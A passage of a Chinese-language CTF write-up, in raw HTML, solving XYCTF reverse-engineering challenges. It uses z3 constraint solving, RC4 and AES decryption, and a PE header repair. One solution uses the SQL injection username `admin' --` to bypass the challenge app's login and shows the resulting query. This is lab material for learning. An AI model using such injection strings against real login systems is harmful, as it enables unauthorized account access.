class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">178</span>)))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">28</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">28</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">5</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">246</span>))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">17</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">168</span>)))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">30</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">30</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">21</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">220</span>))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">22</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">212</span>))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">16</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">232</span>)))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">25</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">25</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">4</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">140</span>))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">31</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">250</span>))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">28</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">150</span>)))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">11</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">11</span>]))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">13</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">13</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">14</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">234</span>)))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">7</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">7</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">174</span>)))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">3</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">3</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">25</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">242</span>)))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">29</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">29</span>]))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">5</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">5</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">30</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">142</span>))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">26</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">170</span>))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">19</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">176</span>)))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">0</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">27</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">168</span>)))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">20</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">20</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">20</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">212</span>)))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">21</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">21</span>]))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">6</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">6</span>]))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">18</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">18</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">18</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">178</span>)))) + <span class="hljs-number">297412</span> == <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;yes&#x27;</span>)<br></code></pre></td></tr></table></figure><p>分析一下主要表达式<code>sum((lambda .0: [ &lt;参数1&gt; for _ in .0 ])(range(&lt;参数2&gt;)))</code><br><code>lambda .0: [ &lt;参数1&gt; for _ in .0 ] </code>定义了一个匿名函数，接受参数.0（即range(&lt;参数2&gt;)生成的序列）<br><code>range(&lt;参数2&gt;)</code> 生成一个长度为&lt;参数2&gt;的整数序列（如&lt;参数2&gt;&#x3D;3时生成0,1,2）<br>列表推导式 [ &lt;参数1&gt; for _ in .0 ] 会创建包含&lt;参数2&gt;个&lt;参数1&gt;的列表（如[5,5,5]）<br>sum(…) 对该列表求和，本质上是将&lt;参数1&gt;累加&lt;参数2&gt;次，即**&lt;参数1&gt; * &lt;参数2&gt;**<br>用 z3 约束求解</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br>solver = Solver()<br><br>flags = [Real(<span class="hljs-string">f&#x27;flag<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>)]<br><br>solver.add(<br>    (flags[<span class="hljs-number">23</span>] ** <span class="hljs-number">2</span>) + (flags[<span class="hljs-number">12</span>] ** <span class="hljs-number">2</span>) + (flags[<span class="hljs-number">1</span>] ** <span class="hljs-number">2</span>) - (<span class="hljs-number">222</span> * flags[<span class="hljs-number">24</span>]) + (flags[<span class="hljs-number">22</span>] ** <span class="hljs-number">2</span>) +<br>    (flags[<span class="hljs-number">31</span>] ** <span class="hljs-number">2</span>) + (flags[<span class="hljs-number">26</span>] ** <span class="hljs-number">2</span>) - (<span class="hljs-number">178</span> * flags[<span class="hljs-number">9</span>]) - (<span class="hljs-number">232</span> * flags[<span class="hljs-number">29</span>]) + (flags[<span class="hljs-number">17</span>] ** <span class="hljs-number">2</span>) -<br>    (<span class="hljs-number">150</span> * flags[<span class="hljs-number">23</span>]) - (<span class="hljs-number">226</span> * flags[<span class="hljs-number">6</span>]) - (<span class="hljs-number">110</span> * flags[<span class="hljs-number">7</span>]) + (flags[<span class="hljs-number">19</span>] ** <span class="hljs-number">2</span>) + (flags[<span class="hljs-number">2</span>] ** <span class="hljs-number">2</span>) -<br>    (<span class="hljs-number">176</span> * flags[<span class="hljs-number">0</span>]) + (flags[<span class="hljs-number">10</span>] ** <span class="hljs-number">2</span>) - (<span class="hljs-number">198</span> * flags[<span class="hljs-number">12</span>]) + (flags[<span class="hljs-number">24</span>] ** <span class="hljs-number">2</span>) + (flags[<span class="hljs-number">9</span>] ** <span class="hljs-number">2</span>) -<br>    (<span class="hljs-number">168</span> * flags[<span class="hljs-number">3</span>]) + (flags[<span class="hljs-number">8</span>] ** <span class="hljs-number">2</span>) - (<span class="hljs-number">134</span> * flags[<span class="hljs-number">2</span>]) + (flags[<span class="hljs-number">14</span>] ** <span class="hljs-number">2</span>) - (<span class="hljs-number">170</span> * flags[<span class="hljs-number">13</span>]) +<br>    (flags[<span class="hljs-number">4</span>] ** <span class="hljs-number">2</span>) - (<span class="hljs-number">142</span> * flags[<span class="hljs-number">10</span>]) + (flags[<span class="hljs-number">27</span>] ** <span class="hljs-number">2</span>) + (flags[<span class="hljs-number">15</span>] ** <span class="hljs-number">2</span>) - (<span class="hljs-number">224</span> * flags[<span class="hljs-number">15</span>]) +<br>    (flags[<span class="hljs-number">16</span>] ** <span class="hljs-number">2</span>) - (<span class="hljs-number">230</span> * flags[<span class="hljs-number">11</span>]) - (<span class="hljs-number">178</span> * flags[<span class="hljs-number">1</span>]) + (flags[<span class="hljs-number">28</span>] ** <span class="hljs-number">2</span>) - (<span class="hljs-number">246</span> * flags[<span class="hljs-number">5</span>]) -<br>    (<span class="hljs-number">168</span> * flags[<span class="hljs-number">17</span>]) + (flags[<span class="hljs-number">30</span>] ** <span class="hljs-number">2</span>) - (<span class="hljs-number">220</span> * flags[<span class="hljs-number">21</span>]) - (<span class="hljs-number">212</span> * flags[<span class="hljs-number">22</span>]) - (<span class="hljs-number">232</span> * flags[<span class="hljs-number">16</span>]) +<br>    (flags[<span class="hljs-number">25</span>] ** <span class="hljs-number">2</span>) - (<span class="hljs-number">140</span> * flags[<span class="hljs-number">4</span>]) - (<span class="hljs-number">250</span> * flags[<span class="hljs-number">31</span>]) - (<span class="hljs-number">150</span> * flags[<span class="hljs-number">28</span>]) + (flags[<span class="hljs-number">11</span>] ** <span class="hljs-number">2</span>) +<br>    (flags[<span class="hljs-number">13</span>] ** <span class="hljs-number">2</span>) - (<span class="hljs-number">234</span> * flags[<span class="hljs-number">14</span>]) + (flags[<span class="hljs-number">7</span>] ** <span class="hljs-number">2</span>) - (<span class="hljs-number">174</span> * flags[<span class="hljs-number">8</span>]) + (flags[<span class="hljs-number">3</span>] ** <span class="hljs-number">2</span>) -<br>    (<span class="hljs-number">242</span> * flags[<span class="hljs-number">25</span>]) + (flags[<span class="hljs-number">29</span>] ** <span class="hljs-number">2</span>) + (flags[<span class="hljs-number">5</span>] ** <span class="hljs-number">2</span>) - (<span class="hljs-number">142</span> * flags[<span class="hljs-number">30</span>]) - (<span class="hljs-number">170</span> * flags[<span class="hljs-number">26</span>]) -<br>    (<span class="hljs-number">176</span> * flags[<span class="hljs-number">19</span>]) + (flags[<span class="hljs-number">0</span>] ** <span class="hljs-number">2</span>) - (<span class="hljs-number">168</span> * flags[<span class="hljs-number">27</span>]) + (flags[<span class="hljs-number">20</span>] ** <span class="hljs-number">2</span>) - (<span class="hljs-number">212</span> * flags[<span class="hljs-number">20</span>]) +<br>    (flags[<span class="hljs-number">21</span>] ** <span class="hljs-number">2</span>) + (flags[<span class="hljs-number">6</span>] ** <span class="hljs-number">2</span>) + (flags[<span class="hljs-number">18</span>] ** <span class="hljs-number">2</span>) - (<span class="hljs-number">178</span> * flags[<span class="hljs-number">18</span>]) + <span class="hljs-number">297412</span> == <span class="hljs-number">0</span><br>)<br><br><span class="hljs-keyword">if</span> solver.check() == sat:<br>    model = solver.model()<br>    result = [<span class="hljs-built_in">str</span>(model[flag]) <span class="hljs-keyword">if</span> model[flag] <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">for</span> flag <span class="hljs-keyword">in</span> flags]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; &#x27;</span>.join(result))<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No solution found.&quot;</span>)<br><br><span class="hljs-comment">#88 89 67 84 70 123 113 55 87 89 71 115 99 85 117 112 116 84 89 88 106 110 106 75 111 121 85 84 75 116 71 125</span><br></code></pre></td></tr></table></figure><p>这个好像要把类型设置成<strong>Real</strong>才跑得出来，用 Int 类型没解出来<br>把结果扔 CyberChef 里解<br><img src="/../images/XYCTF/math.png"><br>flag 为 <code>XYCTF&#123;q7WYGscUuptTYXjnjKoyUTKtG&#125;</code></p><h3 id="Trustme"><a href="#Trustme" class="headerlink" title="Trustme"></a>Trustme</h3><p>jadx 打开，在 MainAcitity 里看到标准RC4，并且给出了密文和密钥<br>先解一下这个RC4</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_dec</span>(<span class="hljs-params">ciphertext, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br> <br>    i = j = <span class="hljs-number">0</span><br>    plaintext = []<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> ciphertext:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        k = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        plaintext.append(byte ^ k)<br> <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(plaintext)<br>enc_data = [<span class="hljs-number">0x5A</span>,<span class="hljs-number">0X3C</span>,<span class="hljs-number">0X46</span>,<span class="hljs-number">0XE0</span>,<span class="hljs-number">0X22</span>,<span class="hljs-number">0X8B</span>,<span class="hljs-number">0X44</span>,<span class="hljs-number">0X4D</span>,<span class="hljs-number">0XEC</span>,<span class="hljs-number">0XC7</span>,<span class="hljs-number">0X65</span>,<span class="hljs-number">0X1C</span>,<span class="hljs-number">0X8A</span>,<span class="hljs-number">0X7C</span>,<span class="hljs-number">0XA9</span>,<span class="hljs-number">0X3B</span>,<span class="hljs-number">0XA4</span>,<span class="hljs-number">0XCB</span>,<span class="hljs-number">0X35</span>,<span class="hljs-number">0XA4</span>,<span class="hljs-number">0X6F</span>,<span class="hljs-number">0X7E</span>,<span class="hljs-number">0XB5</span>,<span class="hljs-number">0X89</span>,<span class="hljs-number">0XBE</span>,<span class="hljs-number">0XF4</span>]<br>key = <span class="hljs-string">b&#x27;XYCTF&#x27;</span><br> <br>dec_data = rc4_dec(enc_data,key)<br><span class="hljs-built_in">print</span>(dec_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><p>输出为 <code>The Real username is admin</code><br>在手机上试试 SQL 注入，username 填<code>admin&#39; --</code>，密码随意<br>这样拼接后，SQL语句变成<br><code>SELECT * FROM users WHERE username = &#39;admin&#39; -- &#39; AND password = &#39;anything&#39;;</code><br><img src="/../images/XYCTF/trust1.png"><br><img src="/../images/XYCTF/trust2.png"><br>flag 为 <code>XYCTF&#123;And0r1d_15_V3ryEasy&#125;</code></p><h3 id="今夕是何年"><a href="#今夕是何年" class="headerlink" title="今夕是何年"></a>今夕是何年</h3><p>题目说的运行就能出 flag，但是在 win 和 linux 上都运行不了，用 <code>DIE</code>查看文件信息<br><img src="/../images/XYCTF/jinxi.png"><br>well，是龙，在 Ubuntu 上装个 qemu-loongarch64，直接运行<br><img src="/../images/XYCTF/jinxi1.png"><br>flag 为 <code>XYCTF&#123;7e5165f1-385d-4fe9-1f2664d833a648a4&#125;</code></p><h3 id="easy-language"><a href="#easy-language" class="headerlink" title="easy language"></a>easy language</h3><p><del>三分逆向七分猜</del>，ida 查找字符串，看到 <strong>AES-ECB</strong><br><img src="/../images/XYCTF/ez1.png"><br>在后面又看到 16 字节的字符串，密钥 get，那密钥上面的就是密文了<br><img src="/../images/XYCTF/ez.png"><br>CyberChef 一把梭<br><img src="/../images/XYCTF/ez2.png"><br>flag 为 <code>XYCTF&#123;y0u_@r3_v3ry_g00d_a7_E_l@ngu@ge&#125;</code></p><h3 id="舔狗四部曲–相逢已是上上签"><a href="#舔狗四部曲–相逢已是上上签" class="headerlink" title="舔狗四部曲–相逢已是上上签"></a>舔狗四部曲–相逢已是上上签</h3><p>直接用 ida 打开看又是一坨，题目提示 PE，用 010Editor 打开<br><img src="/../images/XYCTF/xf.png"><br>64字节的 DOS 头(前四行)的最后一个成员是指向 PE 头的偏移地址的，从突出可以看出这道题两者是对不上的，被魔改了，直接手动改回来，把<code>10 01 00 00</code>改成<code>00 01 00 00</code>，保存，把改后的 exe 再扔进 DIE 看都能发现一切正常了<br><img src="/../images/XYCTF/xf1.png"><br>ida 看 main 函数，先用 z3 求出 key，加密函数是 xxtea<br>求解key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>solver = Solver()<br><br>keys=[Int(<span class="hljs-string">f&#x27;key<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>)]<br><br>solver.add(<span class="hljs-number">532</span> * keys[<span class="hljs-number">5</span>]+ <span class="hljs-number">829</span> * keys[<span class="hljs-number">4</span>]+ <span class="hljs-number">258</span> *keys[<span class="hljs-number">3</span>]+ <span class="hljs-number">811</span> * keys[<span class="hljs-number">2</span>]+ <span class="hljs-number">997</span> * keys[<span class="hljs-number">1</span>] + <span class="hljs-number">593</span> * keys[<span class="hljs-number">0</span>]== <span class="hljs-number">292512</span>)<br>solver.add(<span class="hljs-number">576</span>*keys[<span class="hljs-number">5</span>]+ <span class="hljs-number">695</span> * keys[<span class="hljs-number">4</span>]+ <span class="hljs-number">602</span> *keys[<span class="hljs-number">3</span>]+ <span class="hljs-number">328</span> * keys[<span class="hljs-number">2</span>]+ <span class="hljs-number">686</span> * keys[<span class="hljs-number">1</span>] + <span class="hljs-number">605</span> * keys[<span class="hljs-number">0</span>]== <span class="hljs-number">254496</span>)<br>solver.add(<span class="hljs-number">580</span>*keys[<span class="hljs-number">5</span>]+ <span class="hljs-number">448</span> * keys[<span class="hljs-number">4</span>]+ <span class="hljs-number">756</span> *keys[<span class="hljs-number">3</span>]+ <span class="hljs-number">449</span>* keys[<span class="hljs-number">2</span>]+ <span class="hljs-number">512</span> * keys[<span class="hljs-number">1</span>] + <span class="hljs-number">373</span>* keys[<span class="hljs-number">0</span>]== <span class="hljs-number">222479</span>)  <span class="hljs-comment"># &lt;&lt;9改成*512(512 = 2^9)</span><br>solver.add(<span class="hljs-number">597</span>*keys[<span class="hljs-number">5</span>]+ <span class="hljs-number">855</span> * keys[<span class="hljs-number">4</span>]+ <span class="hljs-number">971</span> *keys[<span class="hljs-number">3</span>]+ <span class="hljs-number">422</span> * keys[<span class="hljs-number">2</span>]+ <span class="hljs-number">635</span> * keys[<span class="hljs-number">1</span>] + <span class="hljs-number">560</span> * keys[<span class="hljs-number">0</span>]== <span class="hljs-number">295184</span>)<br>solver.add(<span class="hljs-number">524</span>*keys[<span class="hljs-number">5</span>]+ <span class="hljs-number">324</span> * keys[<span class="hljs-number">4</span>]+ <span class="hljs-number">925</span> *keys[<span class="hljs-number">3</span>]+ <span class="hljs-number">388</span> * keys[<span class="hljs-number">2</span>]+ <span class="hljs-number">507</span> * keys[<span class="hljs-number">1</span>] + <span class="hljs-number">717</span> * keys[<span class="hljs-number">0</span>]== <span class="hljs-number">251887</span>)<br>solver.add(<span class="hljs-number">414</span>*keys[<span class="hljs-number">5</span>]+ <span class="hljs-number">495</span> * keys[<span class="hljs-number">4</span>]+ <span class="hljs-number">518</span> *keys[<span class="hljs-number">3</span>]+ <span class="hljs-number">884</span> * keys[<span class="hljs-number">2</span>]+ <span class="hljs-number">368</span> * keys[<span class="hljs-number">1</span>] + <span class="hljs-number">312</span> * keys[<span class="hljs-number">0</span>]== <span class="hljs-number">211260</span>)<br><br><span class="hljs-keyword">if</span> solver.check() == sat:<br>    model = solver.model()<br>    key_values = [model[k].as_long() <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> keys]<br>    <span class="hljs-comment"># 将数值转换为字符</span><br>    key = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(val) <span class="hljs-keyword">for</span> val <span class="hljs-keyword">in</span> key_values)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Find key: <span class="hljs-subst">&#123;key&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No solution found.&quot;</span>)<br><br><span class="hljs-comment"># Find key: XYCTF!   </span><br></code></pre></td></tr></table></figure><p>求解flag</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-comment">// 定义魔改参数</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 